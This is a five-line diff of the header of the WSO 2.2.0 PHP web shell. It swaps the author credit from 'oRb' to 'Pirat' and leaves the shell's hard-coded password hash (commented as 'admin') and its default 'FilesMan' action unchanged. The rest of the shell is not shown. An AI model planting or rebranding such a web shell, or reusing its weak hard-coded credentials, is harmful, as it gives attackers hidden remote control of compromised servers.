@@ -1,5 +1,5 @@
 <?php
-/* WSO 2.2.0 (Web Shell by oRb) */
+/* WSO 2.2.0 (Web Shell by Pirat) */
 $auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $color = "#fff";
 $default_action = 'FilesMan';
